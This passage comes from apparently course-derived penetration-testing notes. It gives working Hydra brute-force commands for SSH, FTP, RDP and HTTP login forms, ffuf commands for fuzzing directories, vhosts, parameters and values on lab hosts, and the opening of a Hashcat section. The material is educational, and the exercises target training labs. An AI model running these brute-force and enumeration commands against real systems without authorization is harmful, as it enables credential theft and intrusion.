<li><code>^USER^</code> and <code>^PASS^</code> are placeholders that Hydra replaces with actual credentials</li>
<li>The failure string (after the second <code>:</code>) helps Hydra identify failed login attempts</li>
<li>Use <code>F=</code> prefix for failure strings (e.g., <code>F=incorrect</code>)</li>
</ul>
<p>Example:</p>
<pre><code class="language-sh">hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<hr>
<h2 id="password-generation--x"><a class="header" href="#password-generation--x">Password Generation (-x)</a></h2>
<p>The <code>-x</code> option allows Hydra to generate passwords dynamically instead of using a wordlist. This is useful when you have information about password requirements.</p>
<p>Format: <code>-x MIN:MAX:CHARSET</code></p>
<ul>
<li><code>MIN</code>: Minimum password length</li>
<li><code>MAX</code>: Maximum password length</li>
<li><code>CHARSET</code>: Character set to use
<ul>
<li><code>a</code> = lowercase letters</li>
<li><code>A</code> = uppercase letters</li>
<li><code>1</code> = numbers</li>
<li>Custom character sets can be specified directly</li>
</ul>
</li>
</ul>
<p>Example: If you know the password is 6-8 characters with lowercase, uppercase, and numbers:</p>
<pre><code class="language-sh">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://192.168.1.100
</code></pre>
<p>This command instructs Hydra to:</p>
<ul>
<li>Use the username ‚Äúadministrator‚Äù</li>
<li>Generate and test passwords ranging from 6 to 8 characters</li>
<li>Use the specified character set (lowercase, uppercase, numbers)</li>
<li>Target the RDP service on 192.168.1.100</li>
</ul>
<p>Hydra will generate and test all possible password combinations within the specified parameters.</p>
<hr>
<h2 id="common-usage-examples-1"><a class="header" href="#common-usage-examples-1">Common Usage Examples</a></h2>
<h3 id="ssh-brute-force-1"><a class="header" href="#ssh-brute-force-1">SSH Brute Force</a></h3>
<pre><code class="language-sh">hydra -l root -P /path/to/passwords.txt -t 4 ssh://192.168.1.100
</code></pre>
<h3 id="ftp-brute-force-with-username-list"><a class="header" href="#ftp-brute-force-with-username-list">FTP Brute Force with Username List</a></h3>
<pre><code class="language-sh">hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100
</code></pre>
<h3 id="http-post-form-attack-3"><a class="header" href="#http-post-form-attack-3">HTTP POST Form Attack</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<h3 id="rdp-with-password-generation-1"><a class="header" href="#rdp-with-password-generation-1">RDP with Password Generation</a></h3>
<pre><code class="language-sh">hydra -l administrator -x 6:8:aA1 rdp://192.168.1.100
</code></pre>
<h3 id="ssh-on-non-default-port-1"><a class="header" href="#ssh-on-non-default-port-1">SSH on Non-Default Port</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
</code></pre>
<h3 id="stop-after-first-success-1"><a class="header" href="#stop-after-first-success-1">Stop After First Success</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -f ssh://192.168.1.100
</code></pre>
<h3 id="verbose-output-for-debugging"><a class="header" href="#verbose-output-for-debugging">Verbose Output for Debugging</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -v ssh://192.168.1.100
</code></pre>
<hr>
<h2 id="core-takeaways-2"><a class="header" href="#core-takeaways-2">Core Takeaways</a></h2>
<ul>
<li>Hydra uses parallel connections to speed up brute-force attacks significantly.</li>
<li>Login options (<code>-l</code> or <code>-L</code>) specify usernames, while password options (<code>-p</code>, <code>-P</code>, or <code>-x</code>) specify passwords.</li>
<li>The <code>-x</code> option allows dynamic password generation based on length and character set requirements.</li>
<li>HTTP form attacks require specific syntax with <code>^USER^</code> and <code>^PASS^</code> placeholders.</li>
<li>Use <code>-f</code> to stop after the first successful login, and <code>-v</code>/<code>-V</code> for detailed output.</li>
<li>Adjust <code>-t</code> to control parallel threads, balancing speed against detection risk.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ffuf"><a class="header" href="#ffuf">FFuf</a></h1>
<p>FFuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go. Tools such as ffuf provide us with a handy automated way to fuzz the web application‚Äôs individual components or a web page. This means, for example, that we use a list that is used to send requests to the webserver if the page with the name from our list exists on the webserver. If we get a response code 200, then we know that this page exists on the webserver, and we can look at it manually.</p>
<p>Understanding how ffuf works is critical for effective web enumeration and penetration testing. The following topics will be discussed:</p>
<ul>
<li>Fuzzing for directories</li>
<li>Fuzzing for files and extensions</li>
<li>Identifying hidden vhosts</li>
<li>Fuzzing for PHP parameters</li>
<li>Fuzzing for parameter values</li>
</ul>
<hr>
<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
<p>The term <strong>fuzzing</strong> refers to a testing technique that sends various types of user input to a certain interface to study how it would react. If we were fuzzing for SQL injection vulnerabilities, we would be sending random special characters and seeing how the server would react. If we were fuzzing for a buffer overflow, we would be sending long strings and incrementing their length to see if and when the binary would break.</p>
<p>We usually utilize pre-defined wordlists of commonly used terms for each type of test for web fuzzing to see if the webserver would accept them. This is done because web servers do not usually provide a directory of all available links and domains (unless terribly configured), and so we would have to check for various links and see which ones return pages.</p>
<p>For example, if we visit a page that doesn‚Äôt exist, we would get an HTTP code <strong>404 Page Not Found</strong>. However, if we visit a page that exists, like <code>/login</code>, we would get the login page and get an HTTP code <strong>200 OK</strong>.</p>
<p>This is the basic idea behind web fuzzing for pages and directories. Still, we cannot do this manually, as it will take forever. This is why we have tools that do this automatically, efficiently, and very quickly. Such tools send hundreds of requests every second, study the response HTTP code, and determine whether the page exists or not. Thus, we can quickly determine what pages exist and then manually examine them to see their content.</p>
<hr>
<h2 id="wordlists-1"><a class="header" href="#wordlists-1">Wordlists</a></h2>
<p>To determine which pages exist, we should have a wordlist containing commonly used words for web directories and pages, very similar to a Password Dictionary Attack. Though this will not reveal all pages under a specific website, as some pages are randomly named or use unique names, in general, this returns the majority of pages, reaching up to 90% success rate on some websites.</p>
<p>We will not have to reinvent the wheel by manually creating these wordlists, as great efforts have been made to search the web and determine the most commonly used words for each type of fuzzing. Some of the most commonly used wordlists can be found under the GitHub SecLists repository, which categorizes wordlists under various types of fuzzing, even including commonly used passwords.</p>
<p>Within our PwnBox, we can find the entire SecLists repo available under <code>/opt/useful/SecLists</code>. The specific wordlist we will be utilizing for pages and directory fuzzing is another commonly used wordlist called directory-list-2.3, and it is available in various forms and sizes.</p>
<p><strong>Tip:</strong> Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following in ffuf to get rid of these lines with the <code>-ic</code> flag.</p>
<h3 id="common-wordlists"><a class="header" href="#common-wordlists">Common Wordlists</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Path</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><strong>Directory/Page</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td><td>General directory and file discovery</td></tr>
<tr><td><strong>Extensions</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code></td><td>File extension variations</td></tr>
<tr><td><strong>Domain</strong></td><td><code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>Subdomain enumeration</td></tr>
<tr><td><strong>Parameters</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td><td>Common parameter names</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="directory-fuzzing-1"><a class="header" href="#directory-fuzzing-1">Directory Fuzzing</a></h2>
<p>We start by learning the basics of using ffuf to fuzz websites for directories. The main two options are <code>-w</code> for wordlists and <code>-u</code> for the URL. We can assign a wordlist to a keyword to refer to it where we want to fuzz. For example, we can pick our wordlist and assign the keyword <code>FUZZ</code> to it by adding <code>:FUZZ</code> after it.</p>
<p>Next, as we want to be fuzzing for web directories, we can place the <code>FUZZ</code> keyword where the directory would be within our URL.</p>
<h3 id="basic-directory-fuzzing"><a class="header" href="#basic-directory-fuzzing">Basic Directory Fuzzing</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
</code></pre>
<ul>
<li>Replaces <code>FUZZ</code> with each word from the wordlist</li>
<li>Tests almost 90k URLs in less than 10 seconds</li>
<li>Useful for finding admin panels, backup files, configuration files, and hidden endpoints</li>
<li>Results show HTTP status codes (200, 301, 302, etc.) indicating which directories exist</li>
</ul>
<p><strong>Note:</strong> We can even make it go faster if we are in a hurry by increasing the number of threads to 200, for example, with <code>-t 200</code>, but this is not recommended, especially when used on a remote site, as it may disrupt it, and cause a Denial of Service, or bring down your internet connection in severe cases.</p>
<hr>
<h2 id="extension-fuzzing-1"><a class="header" href="#extension-fuzzing-1">Extension Fuzzing</a></h2>
<p>In the previous section, we found that we had access to <code>/blog</code>, but the directory returned an empty page, and we cannot manually locate any links or pages. So, we will once again utilize web fuzzing to see if the directory contains any hidden pages. However, before we start, we must find out what types of pages the website uses, like <code>.html</code>, <code>.aspx</code>, <code>.php</code>, or something else.</p>
<p>One common way to identify that is by finding the server type through the HTTP response headers and guessing the extension. For example, if the server is apache, then it may be <code>.php</code>, or if it was IIS, then it could be <code>.asp</code> or <code>.aspx</code>, and so on. This method is not very practical, though.</p>
<p>So, we will again utilize ffuf to fuzz the extension, similar to how we fuzzed for directories. Instead of placing the <code>FUZZ</code> keyword where the directory name would be, we would place it where the extension would be <code>.FUZZ</code>, and use a wordlist for common extensions.</p>
<p><strong>Note:</strong> The wordlist we chose already contains a dot (.), so we will not have to add the dot after ‚Äúindex‚Äù in our fuzzing.</p>
<p>Before we start fuzzing, we must specify which file that extension would be at the end of! We can always use two wordlists and have a unique keyword for each, and then do <code>FUZZ_1.FUZZ_2</code> to fuzz for both. However, there is one file we can always find in most websites, which is <code>index.*</code>, so we will use it as our file and fuzz extensions on it.</p>
<h3 id="extension-fuzzing-example"><a class="header" href="#extension-fuzzing-example">Extension Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
</code></pre>
<ul>
<li>Tests extensions like <code>.php</code>, <code>.bak</code>, <code>.old</code>, <code>.txt</code>, etc.</li>
<li>Common for finding backup files or alternative file formats</li>
<li>Helps identify what technology stack the website uses</li>
</ul>
<hr>
<h2 id="page-fuzzing-1"><a class="header" href="#page-fuzzing-1">Page Fuzzing</a></h2>
<p>We will now use the same concept of keywords we‚Äôve been using with ffuf, use <code>.php</code> as the extension, place our <code>FUZZ</code> keyword where the filename should be, and use the same wordlist we used for fuzzing directories.</p>
<h3 id="page-fuzzing-example"><a class="header" href="#page-fuzzing-example">Page Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
</code></pre>
<ul>
<li>Useful when you know the directory structure but want to find specific pages</li>
<li>Can be combined with extension fuzzing for comprehensive discovery</li>
<li>Results show which pages exist within the directory</li>
</ul>
<hr>
<h2 id="recursive-fuzzing-1"><a class="header" href="#recursive-fuzzing-1">Recursive Fuzzing</a></h2>
<p>So far, we have been fuzzing for directories, then going under these directories, and then fuzzing for files. However, if we had dozens of directories, each with their own subdirectories and files, this would take a very long time to complete. To be able to automate this, we will utilize what is known as <strong>recursive fuzzing</strong>.</p>
<h3 id="recursive-flags"><a class="header" href="#recursive-flags">Recursive Flags</a></h3>
<p>When we scan recursively, it automatically starts another scan under any newly identified directories that may have on their pages until it has fuzzed the main website and all of its subdirectories.</p>
<p>Some websites may have a big tree of sub-directories, like <code>/login/user/content/uploads/...etc</code>, and this will expand the scanning tree and may take a very long time to scan them all. This is why it is always advised to specify a depth to our recursive scan, such that it will not scan directories that are deeper than that depth. Once we fuzz the first directories, we can then pick the most interesting directories and run another scan to direct our scan better.</p>
<p>In ffuf, we can enable recursive scanning with the <code>-recursion</code> flag, and we can specify the depth with the <code>-recursion-depth</code> flag. If we specify <code>-recursion-depth 1</code>, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like <code>/login/user</code>, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with <code>-e .php</code>.</p>
<p><strong>Note:</strong> We can still use <code>.php</code> as our page extension, as these extensions are usually site-wide.</p>
<p>Finally, we will also add the flag <code>-v</code> to output the full URLs. Otherwise, it may be difficult to tell which <code>.php</code> file lies under which directory.</p>
<h3 id="recursive-fuzzing-example"><a class="header" href="#recursive-fuzzing-example">Recursive Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
</code></pre>
<ul>
<li><code>-recursion</code>: Enables recursive directory fuzzing</li>
<li><code>-recursion-depth</code>: Limits how deep to recurse (prevents infinite loops)</li>
<li><code>-e</code>: Adds extensions to discovered directories</li>
<li><code>-v</code>: Verbose output for better visibility</li>
<li>The scan takes much longer, sent almost six times the number of requests, and the wordlist doubled in size (once with .php and once without)</li>
</ul>
<hr>
<h2 id="dns-records-1"><a class="header" href="#dns-records-1">DNS Records</a></h2>
<p>Once we accessed the page under <code>/blog</code>, we got a message saying Admin panel moved to academy.htb. If we visit the website in our browser, we get can‚Äôt connect to the server at www.academy.htb.</p>
<p>This is because the exercises we do are not public websites that can be accessed by anyone but local websites within HTB. Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local <code>/etc/hosts</code> file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.</p>
<p>If we visit the IP directly, the browser goes to that IP directly and knows how to connect to it. But in this case, we tell it to go to academy.htb, so it looks into the local <code>/etc/hosts</code> file and doesn‚Äôt find any mention of it. It asks the public DNS about it (such as Google‚Äôs DNS 8.8.8.8) and does not find any mention of it, since it is not a public website, and eventually fails to connect.</p>
<p>So, to connect to academy.htb, we would have to add it to our <code>/etc/hosts</code> file:</p>
<pre><code>sudo sh -c 'echo "SERVER_IP  academy.htb" &gt;&gt; /etc/hosts'
</code></pre>
<hr>
<h2 id="sub-domain-fuzzing-1"><a class="header" href="#sub-domain-fuzzing-1">Sub-domain Fuzzing</a></h2>
<p>In this section, we will learn how to use ffuf to identify sub-domains (i.e., <code>*.website.com</code>) for any website.</p>
<h3 id="sub-domains"><a class="header" href="#sub-domains">Sub-domains</a></h3>
<p>A sub-domain is any website underlying another domain. For example, <code>https://photos.google.com</code> is the photos sub-domain of google.com.</p>
<p>In this case, we are simply checking different websites to see if they exist by checking if they have a public DNS record that would redirect us to a working server IP. So, let‚Äôs run a scan and see if we get any hits. Before we can start our scan, we need two things:</p>
<ol>
<li>A wordlist</li>
<li>A target</li>
</ol>
<p>Luckily for us, in the SecLists repo, there is a specific section for sub-domain wordlists, consisting of common words usually used for sub-domains. We can find it in <code>/opt/useful/seclists/Discovery/DNS/</code>. In our case, we would be using a shorter wordlist, which is <code>subdomains-top1million-5000.txt</code>. If we want to extend our scan, we can pick a larger list.</p>
<h3 id="sub-domain-fuzzing-example"><a class="header" href="#sub-domain-fuzzing-example">Sub-domain Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
</code></pre>
<ul>
<li>Places <code>FUZZ</code> in the subdomain position</li>
<li>Useful for finding hidden or forgotten subdomains</li>
<li>Often reveals development, staging, or administrative interfaces</li>
<li>Works for public domains with DNS records</li>
</ul>
<p><strong>Note:</strong> This method only works for public sub-domains with DNS records. For non-public sub-domains or VHosts, we need to use VHost fuzzing instead.</p>
<hr>
<h2 id="vhost-fuzzing-1"><a class="header" href="#vhost-fuzzing-1">VHost Fuzzing</a></h2>
<p>As we saw in the previous section, we were able to fuzz public sub-domains using public DNS records. However, when it came to fuzzing sub-domains that do not have a public DNS record or sub-domains under websites that are not public, we could not use the same method. In this section, we will learn how to do that with VHost Fuzzing.</p>
<h3 id="vhosts-vs-sub-domains"><a class="header" href="#vhosts-vs-sub-domains">VHosts vs. Sub-domains</a></h3>
<p>The key difference between VHosts and sub-domains is that a <strong>VHost</strong> is basically a ‚Äòsub-domain‚Äô served on the same server and has the same IP, such that a single IP could be serving two or more different websites.</p>
<p>VHosts may or may not have public DNS records.</p>
<p>In many cases, many websites would actually have sub-domains that are not public and will not publish them in public DNS records, and hence if we visit them in a browser, we would fail to connect, as the public DNS would not know their IP. Once again, if we use the sub-domain fuzzing, we would only be able to identify public sub-domains but will not identify any sub-domains that are not public.</p>
<p>This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.</p>
<h3 id="vhost-fuzzing-example"><a class="header" href="#vhost-fuzzing-example">VHost Fuzzing Example</a></h3>
<p>To scan for VHosts, without manually adding the entire wordlist to our <code>/etc/hosts</code>, we will be fuzzing HTTP headers, specifically the <code>Host:</code> header. To do that, we can use the <code>-H</code> flag to specify a header and will use the <code>FUZZ</code> keyword within it:</p>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
</code></pre>
<p>We see that all words in the wordlist are returning 200 OK! This is expected, as we are simply changing the header while visiting <code>http://academy.htb:PORT/</code>. So, we know that we will always get 200 OK. However, if the VHost does exist and we send a correct one in the header, we should get a different response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.</p>
<hr>
<h2 id="filtering-results"><a class="header" href="#filtering-results">Filtering Results</a></h2>
<p>So far, we have not been using any filtering to our ffuf, and the results are automatically filtered by default by their HTTP code, which filters out code 404 NOT FOUND, and keeps the rest. However, as we saw in our previous run of ffuf, we can get many responses with code 200. So, in this case, we will have to filter the results based on another factor, which we will learn in this section.</p>
<h3 id="filtering"><a class="header" href="#filtering">Filtering</a></h3>
<p>Ffuf provides the option to match or filter out a specific HTTP code, response size, or amount of words. We can see that with <code>ffuf -h</code>:</p>
<p><strong>MATCHER OPTIONS:</strong></p>
<ul>
<li><code>-mc</code>: Match HTTP status codes, or ‚Äúall‚Äù for everything. (default: 200,204,301,302,307,401,403)</li>
<li><code>-ml</code>: Match amount of lines in response</li>
<li><code>-mr</code>: Match regexp</li>
<li><code>-ms</code>: Match HTTP response size</li>
<li><code>-mw</code>: Match amount of words in response</li>
</ul>
<p><strong>FILTER OPTIONS:</strong></p>
<ul>
<li><code>-fc</code>: Filter HTTP status codes from response. Comma separated list of codes and ranges</li>
<li><code>-fl</code>: Filter by amount of lines in response. Comma separated list of line counts and ranges</li>
<li><code>-fr</code>: Filter regexp</li>
<li><code>-fs</code>: Filter HTTP response size. Comma separated list of sizes and ranges</li>
<li><code>-fw</code>: Filter by amount of words in response. Comma separated list of word counts and ranges</li>
</ul>
<p>In this case, we cannot use matching, as we don‚Äôt know what the response size from other VHosts would be. We know the response size of the incorrect results, which, as seen from the test above, is 900, and we can filter it out with <code>-fs 900</code>.</p>
<h3 id="vhost-fuzzing-with-filtering"><a class="header" href="#vhost-fuzzing-with-filtering">VHost Fuzzing with Filtering</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
</code></pre>
<ul>
<li>Uses the <code>Host</code> header to specify different virtual hosts</li>
<li><code>-fs</code> filters out responses matching the default/known host size</li>
<li>Critical when IP-based enumeration doesn‚Äôt reveal all content</li>
<li>Often discovers internal or development sites</li>
</ul>
<p><strong>Note:</strong> Don‚Äôt forget to add discovered VHosts to <code>/etc/hosts</code> if they don‚Äôt have public DNS records.</p>
<hr>
<h2 id="parameter-fuzzing---get-1"><a class="header" href="#parameter-fuzzing---get-1">Parameter Fuzzing - GET</a></h2>
<p>If we run a recursive ffuf scan on admin.academy.htb, we should find <code>http://admin.academy.htb:PORT/admin/admin.php</code>. If we try accessing this page, we see a message indicating that there must be something that identifies users to verify whether they have access to read the flag. We did not login, nor do we have any cookie that can be verified at the backend. So, perhaps there is a key that we can pass to the page to read the flag. Such keys would usually be passed as a parameter, using either a GET or a POST HTTP request.</p>
<p><strong>Tip:</strong> Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.</p>
<h3 id="get-request-fuzzing"><a class="header" href="#get-request-fuzzing">GET Request Fuzzing</a></h3>
<p>Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a <code>?</code> symbol, like:</p>
<p><code>http://admin.academy.htb:PORT/admin/admin.php?param1=key</code></p>
<p>So, all we have to do is replace <code>param1</code> in the example above with <code>FUZZ</code> and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in <code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code>. With that, we can run our scan.</p>
<p>Once again, we will get many results back, so we will filter out the default response size we are getting.</p>
<h3 id="get-parameter-fuzzing-example"><a class="header" href="#get-parameter-fuzzing-example">GET Parameter Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
</code></pre>
<ul>
<li>Fuzzes parameter names in GET requests</li>
<li>Useful for finding hidden functionality, API endpoints, or vulnerable parameters</li>
<li>Filter by response size to exclude default error pages</li>
</ul>
<hr>
<h2 id="parameter-fuzzing---post-1"><a class="header" href="#parameter-fuzzing---post-1">Parameter Fuzzing - POST</a></h2>
<p>The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a <code>?</code> symbol. POST requests are passed in the data field within the HTTP request.</p>
<p>To fuzz the data field with ffuf, we can use the <code>-d</code> flag, as we saw previously in the output of <code>ffuf -h</code>. We also have to add <code>-X POST</code> to send POST requests.</p>
<p><strong>Tip:</strong> In PHP, ‚ÄúPOST‚Äù data ‚Äúcontent-type‚Äù can only accept ‚Äúapplication/x-www-form-urlencoded‚Äù. So, we can set that in ‚Äúffuf‚Äù with <code>-H 'Content-Type: application/x-www-form-urlencoded'</code>.</p>
<p>So, let us repeat what we did earlier, but place our <code>FUZZ</code> keyword after the <code>-d</code> flag:</p>
<h3 id="post-parameter-fuzzing-example"><a class="header" href="#post-parameter-fuzzing-example">POST Parameter Fuzzing Example</a></h3>
<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<ul>
<li><code>-X POST</code>: Specifies POST method</li>
<li><code>-d</code>: Sets POST data with <code>FUZZ</code> placeholder</li>
<li><code>-H</code>: Sets required headers (Content-Type is often needed)</li>
<li>POST parameters often handle authentication, file uploads, or sensitive operations</li>
</ul>
<h3 id="testing-post-requests-manually"><a class="header" href="#testing-post-requests-manually">Testing POST Requests Manually</a></h3>
<p>We can test POST requests with curl to verify they work before fuzzing:</p>
<pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
</code></pre>
<hr>
<h2 id="value-fuzzing-1"><a class="header" href="#value-fuzzing-1">Value Fuzzing</a></h2>
<p>After fuzzing a working parameter, we now have to fuzz the correct value that would return the flag content we need. This section will discuss fuzzing for parameter values, which should be fairly similar to fuzzing for parameters, once we develop our wordlist.</p>
<h3 id="custom-wordlist"><a class="header" href="#custom-wordlist">Custom Wordlist</a></h3>
<p>When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, as each parameter would expect a certain type of value.</p>
<p>For some parameters, like usernames, we can find a pre-made wordlist for potential usernames, or we may create our own based on users that may potentially be using the website. For such cases, we can look for various wordlists under the seclists directory and try to find one that may contain values matching the parameter we are targeting. In other cases, like custom parameters, we may have to develop our own wordlist.</p>
<p>In this case, we can guess that the <code>id</code> parameter can accept a number input of some sort. These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. We‚Äôll start with a wordlist containing all numbers from 1-1000.</p>
<p>There are many ways to create this wordlist, from manually typing the IDs in a file, or scripting it using Bash or Python. The simplest way is to use the following command in Bash that writes all numbers from 1-1000 to a file:</p>
<h3 id="creating-sequential-wordlists"><a class="header" href="#creating-sequential-wordlists">Creating Sequential Wordlists</a></h3>
<pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done
</code></pre>
<h3 id="value-fuzzing-example"><a class="header" href="#value-fuzzing-example">Value Fuzzing Example</a></h3>
<p>Our command should be fairly similar to the POST command we used to fuzz for parameters, but our <code>FUZZ</code> keyword should be put where the parameter value would be, and we will use the <code>ids.txt</code> wordlist we just created:</p>
<pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<ul>
<li>Fuzzes parameter values instead of names</li>
<li>Useful for finding valid IDs, usernames, or other identifiers</li>
<li>Can reveal authorization flaws or information disclosure</li>
<li>Often requires creating custom wordlists based on the parameter type</li>
</ul>
<hr>
<h2 id="key-options-summary"><a class="header" href="#key-options-summary">Key Options Summary</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-w</code></td><td>Wordlist file path and (optional) keyword separated by colon. eg. ‚Äò/path/to/wordlist:KEYWORD‚Äô</td></tr>
<tr><td><code>-u</code></td><td>Target URL</td></tr>
<tr><td><code>-H</code></td><td>Header <code>"Name: Value"</code>, separated by colon. Multiple -H flags are accepted</td></tr>
<tr><td><code>-X</code></td><td>HTTP method to use (default: GET)</td></tr>
<tr><td><code>-b</code></td><td>Cookie data <code>"NAME1=VALUE1; NAME2=VALUE2"</code> for copy as curl functionality</td></tr>
<tr><td><code>-d</code></td><td>POST data</td></tr>
<tr><td><code>-recursion</code></td><td>Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)</td></tr>
<tr><td><code>-recursion-depth</code></td><td>Maximum recursion depth. (default: 0)</td></tr>
<tr><td><code>-e</code></td><td>File extensions to append</td></tr>
<tr><td><code>-v</code></td><td>Verbose output</td></tr>
<tr><td><code>-t</code></td><td>Number of concurrent threads (default: 40)</td></tr>
<tr><td><code>-mc</code></td><td>Match HTTP status codes, or ‚Äúall‚Äù for everything. (default: 200,204,301,302,307,401,403)</td></tr>
<tr><td><code>-ms</code></td><td>Match HTTP response size</td></tr>
<tr><td><code>-fc</code></td><td>Filter HTTP status codes from response. Comma separated list of codes and ranges</td></tr>
<tr><td><code>-fs</code></td><td>Filter HTTP response size. Comma separated list of sizes and ranges</td></tr>
<tr><td><code>-fl</code></td><td>Filter by amount of lines in response</td></tr>
<tr><td><code>-fw</code></td><td>Filter by amount of words in response</td></tr>
<tr><td><code>-ic</code></td><td>Ignore comments in wordlist</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="core-takeaways-3"><a class="header" href="#core-takeaways-3">Core Takeaways</a></h2>
<ul>
<li>FFuf is fast and efficient for web content discovery, testing almost 90k URLs in less than 10 seconds</li>
<li>The <code>FUZZ</code> keyword is the core mechanism for replacing values from wordlists</li>
<li>Filtering responses is essential for reducing noise, especially when many results return 200 OK</li>
<li>Different fuzzing types target different attack surfaces (directories, parameters, values)</li>
<li>VHost fuzzing is critical when multiple sites share an IP and don‚Äôt have public DNS records</li>
<li>POST parameter fuzzing often reveals more sensitive functionality than GET</li>
<li>Recursive fuzzing automates discovery but should be limited by depth to prevent excessive scanning</li>
<li>Custom wordlists are often needed for value fuzzing based on the parameter type</li>
<li>Always verify discovered endpoints manually before proceeding with further enumeration</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h1>
<p>Hashcat is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.</p>
<p>The success of a password cracking attempt largely depends on the quality of the wordlists and the complexity of the passwords being targeted.</p>
<h2 id="general-syntax"><a class="header" href="#general-syntax">General Syntax</a></h2>
<pre><code class="language-bash">hashcat -a &lt;attack_mode&gt; -m &lt;hash_type&gt; &lt;hashes&gt; [wordlist, rule, mask, ...]
</code></pre>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Argument</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-a</code></td><td>Attack mode</td></tr>
<tr><td><code>-m</code></td><td>Hash type ID</td></tr>
<tr><td><code>&lt;hashes&gt;</code></td><td>Either a hash string or a file containing one or more password hashes of the same type</td></tr>
<tr><td><code>[wordlist, rule, mask, ...]</code></td><td>Additional arguments depending on the attack mode</td></tr>
</tbody>
</table>
</div>
<h2 id="hashing-2"><a class="header" href="#hashing-2">Hashing</a></h2>
<p>Hashing is the process of converting a password into a fixed-length string of characters. Hashes are designed to be irreversible, meaning that it should be computationally infeasible to retrieve the original password from its hash. Common hashing algorithms include MD5, SHA-1, SHA-256, and bcrypt. Typically, a hash function always returns values of the same length regardless of the input size, complexity, etc.</p>
